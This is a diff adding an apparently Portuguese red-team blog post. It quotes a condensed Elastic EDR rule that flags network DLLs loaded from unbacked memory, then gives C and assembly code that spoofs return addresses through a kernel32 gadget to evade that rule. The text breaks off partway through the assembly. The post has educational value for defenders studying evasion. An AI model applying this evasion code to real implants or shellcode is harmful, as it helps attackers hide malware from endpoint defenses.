@@ -1,0 +1,737 @@
+<!DOCTYPE html><html lang="en" class="dark" data-astro-cid-jj6gr7j4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Vithor | Return Address Spoofing</title><meta name="title" content="Vithor | Return Address Spoofing"><meta name="description" content="Como funciona a técnica de Return Address Spoofing para contornar regras de EDR baseadas em call stack unbacked ao carregar DLLs de rede."><link rel="stylesheet" href="/assets/fonts.css"><link rel="stylesheet" href="/assets/about-2.css"><link rel="stylesheet" href="/assets/_slug_.css"><script>
+      const theme = (() => {
+        if (typeof localStorage !== "undefined" && localStorage.getItem("theme")) {
+          return localStorage.getItem("theme");
+        }
+        return "dark";
+      })();
+
+      if (theme === "light") document.documentElement.classList.remove("dark");
+      else document.documentElement.classList.add("dark");
+    </script><link rel="stylesheet" href="/_astro/_slug_@_@astro.BjJ6NIIH.css"></head> <body class="font-sans antialiased min-h-screen bg-gray-100 dark:bg-[#0f0f0f]" data-astro-cid-ylc345xr> <div class="site-single-outer" data-astro-cid-ylc345xr> <article class="site-single" data-astro-cid-ylc345xr> <div class="single-topbar" data-astro-cid-ylc345xr> <a href="javascript:history.back()" class="back-link" data-astro-cid-ylc345xr>← Back</a> <div class="single-topbar__right">  <button type="button" id="theme-toggle-single" aria-label="Toggle theme"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <circle cx="12" cy="12" r="5"></circle> <line x1="12" y1="1" x2="12" y2="3"></line> <line x1="12" y1="21" x2="12" y2="23"></line> <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line> <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line> <line x1="1" y1="12" x2="3" y2="12"></line> <line x1="21" y1="12" x2="23" y2="12"></line> <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line> <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line> </svg> </button> </div> </div> <div class="ruler-scrollbar svelte-xengn3" style="height: clamp(400px, 60vh, 85vh);"> <div class="ruler-track svelte-xengn3"></div> <div class="ruler-indicator svelte-xengn3" style="top: 0%;"> <span class="ruler-value svelte-xengn3">0.00</span> <div class="ruler-pointer svelte-xengn3"></div> </div> </div> <button class="toc-toggle svelte-1r6e6jk" aria-label="Toggle Table of Contents"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"> <line x1="5" y1="7" x2="19" y2="7"></line> <line x1="5" y1="12" x2="19" y2="12"></line> <line x1="5" y1="17" x2="19" y2="17"></line> </svg> </button> <div class="toc-overlay svelte-1r6e6jk" style="display: none;"></div> <div class="toc-sidebar svelte-1r6e6jk"> <div class="toc-header svelte-1r6e6jk"> <span class="toc-title svelte-1r6e6jk">Table of contents</span> <button class="close-btn svelte-1r6e6jk" aria-label="Close menu"> <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <line x1="18" y1="6" x2="6" y2="18"></line> <line x1="6" y1="6" x2="18" y2="18"></line> </svg> </button> </div> <div class="toc-content svelte-1r6e6jk"></div> <div class="toc-footer svelte-1r6e6jk"> <button class="action-btn text-primary svelte-1r6e6jk" data-action="expand">Expand all</button> <button class="action-btn svelte-1r6e6jk" data-action="collapse">Collapse all</button> <div class="h-divider svelte-1r6e6jk"></div> <button class="action-btn svelte-1r6e6jk" data-action="top">Back to top</button> <button class="action-btn svelte-1r6e6jk" data-action="bottom">Go to bottom</button> </div> </div> <div class="post__header" data-astro-cid-jj6gr7j4> <div class="post__tags" data-astro-cid-jj6gr7j4> <a class="post__tag" href="/blog" title="EDR Evasion" data-astro-cid-jj6gr7j4>EDR Evasion</a><a class="post__tag" href="/blog" title="Exploit Development" data-astro-cid-jj6gr7j4>Exploit Development</a><a class="post__tag" href="/blog" title="Red Team" data-astro-cid-jj6gr7j4>Red Team</a> </div> <h1 class="post__title" data-astro-cid-jj6gr7j4>Return Address Spoofing</h1> <h5 class="post__desc" data-astro-cid-jj6gr7j4> <a class="post__author" href="https://x.com/m3mdump" target="_blank" rel="external" data-astro-cid-jj6gr7j4>Vithor</a>
+&nbsp;|&nbsp;
+<span class="post__date" data-astro-cid-jj6gr7j4>Monday, December 22, 2025</span> 
+&nbsp;|&nbsp;
+<span class="post__stats" data-astro-cid-jj6gr7j4>13 min read</span>  </h5> </div> <article class="prose dark:prose-invert text-justify hyphens-auto" data-astro-cid-apjhz64k>  <h2 id="rule-elastic">Rule Elastic<a aria-hidden="true" tabindex="-1" href="#rule-elastic"><span class="icon icon-link"></span></a></h2>
+<p>No meu post <a href="https://vith0r.gitbook.io/public/defense-ops/endpoint-protection/o-que-e-um-edr">O que é um EDR?</a>, eu mostrei a seguinte rule do <a href="https://www.elastic.co/endpoint-detection-response">Elastic</a>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>┌─────────────────────────────────────────────────────────────────────────────┐</span></span>
+<span class="line"><span>│                         ELASTIC ENDPOINT RULE                         │     </span></span>
+<span class="line"><span>│               Network Module Loaded from Suspicious Unbacked Memory   │</span></span>
+<span class="line"><span>└─────────────────────────────────────────────────────────────────────────────┘</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>name = "Network Module Loaded from Suspicious Unbacked Memory"</span></span>
+<span class="line"><span>query = '''</span></span>
+<span class="line"><span>sequence by process.entity_id</span></span>
+<span class="line"><span>  # EVENTO 1: Processo inicia</span></span>
+<span class="line"><span>  [process where event.action == "start" and </span></span>
+<span class="line"><span>   </span></span>
+<span class="line"><span>   # Exceção: ignora processos assinados em Program Files</span></span>
+<span class="line"><span>   not (process.executable : "?:\\Program Files\\*" and </span></span>
+<span class="line"><span>        process.code_signature.trusted == true)</span></span>
+<span class="line"><span>  ]</span></span>
+<span class="line"><span>  # EVENTO 2: DLL de rede carregada (TRIGGER)</span></span>
+<span class="line"><span>  [library where</span></span>
+<span class="line"><span>   </span></span>
+<span class="line"><span>   # DLLs monitoradas</span></span>
+<span class="line"><span>   dll.name : ("ws2_32.dll", "wininet.dll", "winhttp.dll") and</span></span>
+<span class="line"><span>   </span></span>
+<span class="line"><span>   # Call stack contém região UNBACKED</span></span>
+<span class="line"><span>   process.thread.Ext.call_stack_contains_unbacked == true and</span></span>
+<span class="line"><span>   </span></span>
+<span class="line"><span>   # Padrões suspeitos de call stack</span></span>
+<span class="line"><span>   process.thread.Ext.call_stack_summary : (</span></span>
+<span class="line"><span>     "ntdll.dll|kernelbase.dll|Unbacked",</span></span>
+<span class="line"><span>     "ntdll.dll|kernelbase.dll|Unbacked|kernel32.dll|ntdll.dll"</span></span>
+<span class="line"><span>   )</span></span>
+<span class="line"><span>  ]</span></span>
+<span class="line"><span>  until [process where event.action:"end"]</span></span>
+<span class="line"><span>'''</span></span>
+<span class="line"><span># Ação quando detecta</span></span>
+<span class="line"><span>[[actions]]</span></span>
+<span class="line"><span>action = "kill_process"</span></span></code></pre>
+<p><strong>WARNING:</strong> Esta regra está apresentada de forma resumida. A versão completa possui mais de 250 linhas, diversas exceções e outras seções adicionais. Condensei a regra do Elastic apenas para fins de exemplificação.</p>
+<hr>
+<h4 id="por-que-monitorar-dlls-legitmas">Por que monitorar DLLs legitmas?<a aria-hidden="true" tabindex="-1" href="#por-que-monitorar-dlls-legitmas"><span class="icon icon-link"></span></a></h4>
+<p>C2 frameworks como <strong>Cobalt Strike</strong>, <strong>Sliver</strong> e <strong>Havoc</strong> precisam se comunicar com o servidor do atacante. Para isso, geralmente usam:</p>
+<ul>
+<li>
+<p><code>wininet.dll</code> / <code>winhttp.dll</code> → comunicação HTTP/HTTPS</p>
+</li>
+<li>
+<p><code>ws2_32.dll</code> → conexões via socket</p>
+</li>
+</ul>
+<hr>
+<p>A regra da Elastic concentra-se em verificar se essas DLLs foram carregadas a partir de memória (unbacked), pois se uma shellcode em execução na memória tentar carregar alguma DLL a stack vai apontar que quem chamou <code>LoadLibraryA</code> ou outro método, está em uma região de memória (unbacked), e isso vai tomar a ação: <code>action = "kill_process"</code> podemos ver um exemplo disso com essa imagem:</p>
+<p>![[Pasted image 20260422175910.png]]</p>
+<p>Se a DLL tivesse sido carregada por um módulo legitimo teriamos o seguinte resultado na stack:</p>
+<p>![[Pasted image 20260422175926.png]]</p>
+<hr>
+<h2 id="como-contornar-isso">Como Contornar isso?<a aria-hidden="true" tabindex="-1" href="#como-contornar-isso"><span class="icon icon-link"></span></a></h2>
+<p>Existem algumas maneiras para contornar isso, uma delas é manipular o <code>return address</code> para que pareça que foi chamada de uma função legítima (um gadget do tipo <code>jmp rbx</code> por exemplo).</p>
+<p><strong>WARNING:</strong> As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra coisa são estritamente para fins educacionais.</p>
+<p>A ideia básica é preparar um bloco (trampoline/gadget) cuja execução retorne para um endereço legítimo em um módulo confiável.</p>
+<p>Para encontrar esse gadget podemos estar utilizando o seguinte código:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">PBYTE </span><span style="color:#B392F0">FindGadget</span><span style="color:#E1E4E8">(PBYTE </span><span style="color:#FFAB70">pModule</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#F97583">	for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;; i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">		if</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">pModule</span><span style="color:#E1E4E8">[i] </span><span style="color:#F97583">==</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">FF</span><span style="color:#F97583"> &#x26;&#x26;</span><span style="color:#FFAB70"> pModule</span><span style="color:#E1E4E8">[i </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">23</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">			return</span><span style="color:#E1E4E8"> pModule </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> i;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Primeiro, criamos a função <code>FindGadget</code> que recebe <code>pModule</code>, um ponteiro (PBYTE) para o endereço base do módulo desejado (neste caso, a kernel32.dll).</p>
+<p>Dentro da função, usamos um loop for infinito para iterar byte a byte a partir do endereço base do módulo. A variável <code>i</code> representa o offset (deslocamento) em bytes desde o endereço base.</p>
+<p>Em cada iteração, fazemos uma verificação com <code>if</code>: se o byte na posição atual (<code>pModule[i]</code>) for igual a <code>0xFF</code> E o próximo byte (<code>pModule[i + 1]</code>) for igual a <code>0x23</code>, encontramos o gadget.</p>
+<p>Quando a condição é verdadeira, a função retorna <code>pModule + i</code>, que é o endereço exato do gadget (endereço base + offset).</p>
+<p>Caso contrário, o loop continua, e <code>i++</code> incrementa automaticamente no final de cada iteração, avançando para o próximo byte até encontrar o padrão desejado.</p>
+<hr>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">int</span><span style="color:#B392F0"> main</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#E1E4E8">	PBYTE pKernel32 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (PBYTE)</span><span style="color:#B392F0">GetModuleHandleA</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"kernel32"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">	PBYTE pGadget </span><span style="color:#F97583">=</span><span style="color:#B392F0"> FindGadget</span><span style="color:#E1E4E8">(pKernel32);</span></span>
+<span class="line"><span style="color:#B392F0">	printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Gadget encontrado em: 0x</span><span style="color:#79B8FF">%p\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, pGadget);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">	getchar</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">	return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Agora na função <code>main</code>, primeiro precisamos obter o endereço base do módulo <code>kernel32.dll</code>, que é onde vamos iterar para procurar o gadget.</p>
+<p>Para isso, utilizamos a função <a href="https://learn.microsoft.com/pt-br/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea">GetModuleHandleA</a>, passando como argumento o nome do módulo carregado na memória (“kernel32”).</p>
+<p>Essa função retorna um HMODULE (handle do módulo), que na prática é o endereço base onde o módulo está carregado na memória.</p>
+<p>Como queremos acessar byte a byte desse módulo, fazemos um cast (PBYTE) para converter o HMODULE em PBYTE (ponteiro para bytes), permitindo aritmética de ponteiros byte a byte.</p>
+<p>Por fim, armazenamos esse ponteiro em uma variável chamada <code>pKernel32</code> do tipo PBYTE, que agora aponta para o primeiro byte da <code>kernel32.dll</code> permitindo agora iterar pela memória do módulo.</p>
+<hr>
+<p>Após encontrar o gadget com <code>FindGadget</code>, precisamos entender como invocar funções no Windows 64-bit. A arquitetura x64 usa a Microsoft x64 calling convention, que exige:</p>
+<ol>
+<li>
+<p>Os 4 primeiros argumentos devem ser passados nos registradores RCX, RDX, R8 e R9 (nesta ordem)</p>
+</li>
+<li>
+<p>32 bytes de shadow space devem ser reservados na stack antes da chamada (espaço reservado para os 4 primeiros argumentos, mesmo que estejam em registradores)</p>
+</li>
+<li>
+<p>Argumentos adicionais (5º em diante) são colocados na stack após o shadow space</p>
+</li>
+</ol>
+<p>Para gerenciar essa complexidade, criamos a estrutura _STACK_CONFIG:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">typedef</span><span style="color:#F97583"> struct</span><span style="color:#E1E4E8"> _STACK_CONFIG {</span></span>
+<span class="line"><span style="color:#E1E4E8">    PVOID pGadget;</span><span style="color:#6A737D">      // Endereço do gadget encontrado (0xFF 0x23)</span></span>
+<span class="line"><span style="color:#E1E4E8">    PVOID pTarget;</span><span style="color:#6A737D">         // Endereço da função que queremos chamar</span></span>
+<span class="line"><span style="color:#E1E4E8">    PVOID pRbx;</span><span style="color:#6A737D">            // Valor para o registrador RBX (usado no gadget)</span></span>
+<span class="line"><span style="color:#E1E4E8">    PVOID pArgs;</span><span style="color:#6A737D">           // Ponteiro para array com os argumentos</span></span>
+<span class="line"><span style="color:#E1E4E8">} STACK_CONFIG, </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">PSTACK_CONFIG;</span></span></code></pre>
+<p><strong>INFO:</strong> Esta estrutura centraliza todas as informações necessárias para configurar a stack corretamente antes de executar a chamada spoofada via assembly.</p>
+<p>Agora vamos estar criando uma função que vai estar preenchendo os valores dessa estrutura:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">SetupConfig</span><span style="color:#E1E4E8">(PVOID </span><span style="color:#FFAB70">pGadget</span><span style="color:#E1E4E8">, PSTACK_CONFIG </span><span style="color:#FFAB70">pConfig</span><span style="color:#E1E4E8">, PVOID </span><span style="color:#FFAB70">pTarget</span><span style="color:#E1E4E8">, UINT64 </span><span style="color:#FFAB70">arg1</span><span style="color:#E1E4E8">, UINT64 </span><span style="color:#FFAB70">arg2</span><span style="color:#E1E4E8">, UINT64 </span><span style="color:#FFAB70">arg3</span><span style="color:#E1E4E8">, UINT64 </span><span style="color:#FFAB70">arg4</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    pConfig->pTarget </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> pTarget;</span><span style="color:#6A737D">            // Função alvo a ser chamada</span></span>
+<span class="line"><span style="color:#E1E4E8">    pConfig->pGadget </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> pGadget;</span><span style="color:#6A737D">         // Gadget encontrado pelo FindGadget</span></span>
+<span class="line"><span style="color:#E1E4E8">    pConfig->pArgs </span><span style="color:#F97583">=</span><span style="color:#B392F0"> malloc</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">32</span><span style="color:#E1E4E8">);</span><span style="color:#6A737D">           // Aloca 32 bytes (4 args × 8 bytes)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pConfig->pArgs) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span><span style="color:#6A737D">     // Verifica falha na alocação</span></span>
+<span class="line"><span style="color:#6A737D">    // Preenche o array de argumentos (cada UINT64 ocupa 8 bytes)</span></span>
+<span class="line"><span style="color:#E1E4E8">    ((PUINT64)pConfig->pArgs)[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> arg1;</span><span style="color:#6A737D">   // Será carregado em RCX</span></span>
+<span class="line"><span style="color:#E1E4E8">    ((PUINT64)pConfig->pArgs)[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> arg2;</span><span style="color:#6A737D">   // Será carregado em RDX</span></span>
+<span class="line"><span style="color:#E1E4E8">    ((PUINT64)pConfig->pArgs)[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> arg3;</span><span style="color:#6A737D">   // Será carregado em R8</span></span>
+<span class="line"><span style="color:#E1E4E8">    ((PUINT64)pConfig->pArgs)[</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> arg4;</span><span style="color:#6A737D">   // Será carregado em R9</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Na nossa função <code>SetupConfig</code>, ela recebe um total de 7 argumentos:</p>
+<ol>
+<li>
+<p>pGadget ← Endereço do gadget obtido de <code>FindGadget</code></p>
+</li>
+<li>
+<p>pConfig ← Ponteiro para a estrutura que será preenchida (STACK_CONFIG)</p>
+</li>
+<li>
+<p>pTarget ← Endereço da função final que queremos executar ( LoadLibraryA)</p>
+</li>
+<li>
+<p>arg1 a arg4 ← Os 4 argumentos que serão passados para a função alvo</p>
+</li>
+</ol>
+<hr>
+<p>Para preencher nossa estrutura utilizamos:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">pConfig</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">pTarget </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> pTarget;</span></span></code></pre>
+<p>O item <code>pTarget</code> recebe o endereço da função que será chamada. Caso não saiba o operador <code>-></code> acessa o membro <code>pTarget</code> da estrutura apontada por <code>pConfig</code>.</p>
+<p><strong>INFO:</strong> Não farei a explicação sobre <em>pGadget</em>, pois seu funcionamento segue o mesmo princípio de <em>pTarget</em>. Caso os conceitos anteriores não estejam totalmente claros, a compreensão das próximas etapas poderá ser comprometida.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">Config</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">pArgs </span><span style="color:#F97583">=</span><span style="color:#B392F0"> malloc</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">32</span><span style="color:#E1E4E8">);</span></span></code></pre>
+<p>Depois com malloc alocamos memória para armazenar os valores dos 4 argumentos (4 argumentos × 8 bytes = 32 bytes)</p>
+<hr>
+<p>Verificamos se a alocação foi bem-sucedida:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pConfig</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">pArgs) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span></code></pre>
+<p>Se <a href="https://learn.microsoft.com/pt-br/cpp/c-runtime-library/reference/malloc">malloc</a> retornar NULL, a função retorna FALSE.</p>
+<hr>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">((PUINT64)pConfig</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">pArgs)[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> arg1;</span></span>
+<span class="line"><span style="color:#E1E4E8">((PUINT64)pConfig</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">pArgs)[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> arg2;</span></span>
+<span class="line"><span style="color:#E1E4E8">((PUINT64)pConfig</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">pArgs)[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> arg3;</span></span>
+<span class="line"><span style="color:#E1E4E8">((PUINT64)pConfig</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">pArgs)[</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> arg4;</span></span></code></pre>
+<p>Aqui fazemos o cast (PUINT64) para converter o ponteiro <code>pArgs</code> (que é PVOID) em um ponteiro para UINT64. fazemos isso não para converter os valores, mas para interpretar a memória apontada por <code>pArgs</code> como um array de UINT64.</p>
+<p><strong>INFO:</strong> Isso permite indexar a memória como um array de inteiros de 64 bits, onde cada posição:
+([0], [1], [2], [3]) armazena um argumento de 8 bytes.</p>
+<p>Mais pra frente vamos ver que o nosso assembly espera que esses valores estejam organizados em blocos de 8 bytes: • Offset 0 = arg1 • Offset 8 = arg2 • Offset 16 = arg3 • Offset 24 = arg4</p>
+<hr>
+<p>Agora nosso código ASM irá ficar dessa forma:</p>
+<p><strong>WARNING:</strong> O código assembly a seguir é meio chatinho de entender, eu mesmo levei algumas horas pra pegar tudo. Por isso deixei o código comentado e fiz uma explicação extra depois.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#E1E4E8">.code</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">; Estrutura que espelha _STACK_CONFIG do C++</span></span>
+<span class="line"><span style="color:#6A737D">; Cada campo ocupa 8 bytes (QWORD) em x64</span></span>
+<span class="line"><span style="color:#E1E4E8">Config STRUCT</span></span>
+<span class="line"><span style="color:#E1E4E8">	pGadget </span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> ?    </span><span style="color:#6A737D">; Endereço do gadget (0xFF 0x23 - jmp [rbx])</span></span>
+<span class="line"><span style="color:#E1E4E8">	pTarget </span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> ?       </span><span style="color:#6A737D">; Endereço da função alvo a ser chamada</span></span>
+<span class="line"><span style="color:#E1E4E8">	pRbx </span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> ?          </span><span style="color:#6A737D">; Armazena endereço de retorno para cleanup</span></span>
+<span class="line"><span style="color:#E1E4E8">	pArgs </span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> ?         </span><span style="color:#6A737D">; Ponteiro para array com os 4 argumentos</span></span>
+<span class="line"><span style="color:#E1E4E8">Config ENDS</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">PUBLIC Spoof</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">Spoof PROC</span></span>
+<span class="line"><span style="color:#F97583">	pop</span><span style="color:#79B8FF"> rdi</span><span style="color:#6A737D"> ; Salva endereço de retorno original (onde Spoof deve voltar)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">	; RCX contém o ponteiro para _STACK_CONFIG (1º argumento x64)</span></span>
+<span class="line"><span style="color:#6A737D">	; Copia para R10 para liberar RCX</span></span>
+<span class="line"><span style="color:#F97583">	mov</span><span style="color:#79B8FF"> r10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">rcx</span><span style="color:#6A737D"> ; r10 contém o endereço da struct</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">  ; Config.pArgs = É o offset (deslocamento em bytes) do campo pArgs dentro da estrutura</span></span>
+<span class="line"><span style="color:#F97583">	mov</span><span style="color:#79B8FF"> r13</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r10</span><span style="color:#E1E4E8">+Config.pArgs] </span><span style="color:#6A737D">; r13 agora aponta pro array de argumentos</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">	; Carrega os 4 argumentos nos registradores conforme x64 calling convention</span></span>
+<span class="line"><span style="color:#F97583">	mov</span><span style="color:#79B8FF"> rcx</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r13</span><span style="color:#E1E4E8">]        </span><span style="color:#6A737D">; arg1 → RCX (offset +0)</span></span>
+<span class="line"><span style="color:#F97583">	mov</span><span style="color:#79B8FF"> rdx</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r13</span><span style="color:#E1E4E8">+</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">]      </span><span style="color:#6A737D">; arg2 → RDX (offset +8)</span></span>
+<span class="line"><span style="color:#F97583">	mov</span><span style="color:#79B8FF"> r8</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r13</span><span style="color:#E1E4E8">+</span><span style="color:#79B8FF">16</span><span style="color:#E1E4E8">]      </span><span style="color:#6A737D">; arg3 → R8  (offset +16)</span></span>
+<span class="line"><span style="color:#F97583">	mov</span><span style="color:#79B8FF"> r9</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r13</span><span style="color:#E1E4E8">+</span><span style="color:#79B8FF">24</span><span style="color:#E1E4E8">]      </span><span style="color:#6A737D">; arg4 → R9  (offset +24)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">	; Cria shadow space (32 bytes obrigatórios x64)</span></span>
+<span class="line"><span style="color:#F97583">	sub</span><span style="color:#79B8FF"> rsp</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">32</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">	; Carrega endereço do gadget em RAX</span></span>
+<span class="line"><span style="color:#F97583">	mov</span><span style="color:#79B8FF"> rax</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r10</span><span style="color:#E1E4E8">+Config.pGadget]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">	; Coloca gadget no topo da stack (será o endereço de retorno falso)</span></span>
+<span class="line"><span style="color:#F97583">	push</span><span style="color:#79B8FF"> rax</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">	; Prepara RBX para o gadget usar: jmp [rbx] pulará para 'cleanup'</span></span>
+<span class="line"><span style="color:#F97583">	lea</span><span style="color:#79B8FF"> rbx</span><span style="color:#E1E4E8">,cleanup                    </span><span style="color:#6A737D">; Carrega endereço de 'cleanup' em RBX</span></span>
+<span class="line"><span style="color:#F97583">	mov</span><span style="color:#F97583"> QWORD</span><span style="color:#E1E4E8"> PTR [</span><span style="color:#79B8FF">r10</span><span style="color:#E1E4E8">+Config.pRbx],</span><span style="color:#79B8FF">rbx</span><span style="color:#6A737D"> ; Salva em pRbx da struct</span></span>
+<span class="line"><span style="color:#F97583">	lea</span><span style="color:#79B8FF"> rbx</span><span style="color:#E1E4E8">,[</span><span style="color:#79B8FF">r10</span><span style="color:#E1E4E8">+Config.pRbx]          </span><span style="color:#6A737D">; RBX aponta para o campo pRbx</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">	; Pula para a função alvo (com stack spoofado)</span></span>
